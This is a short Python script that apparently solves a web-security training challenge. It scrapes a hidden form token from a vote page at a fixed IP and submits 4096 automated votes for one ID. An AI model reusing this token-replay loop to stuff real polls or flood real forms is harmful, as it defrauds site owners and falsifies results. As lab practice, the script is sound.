#!/usr/bin/python3
import requests
from bs4 import BeautifulSoup

url_hodor = "http://158.69.76.135/level1.php"


def current_session(session):
    current = session.get(url_hodor)
    soup = BeautifulSoup(current.text, "html.parser")
    result = soup.find_all('input', {'type': 'hidden'})
    return {
        "id": "4386",
        "holdthedoor": "Submit",
        "key": result[0].get("value"),
    }


with requests.session() as session:
    for i in range(4096):
        res = session.post(
            url=url_hodor,
            data=current_session(session),
        )
        print(f"Vote count:{i + 1}")
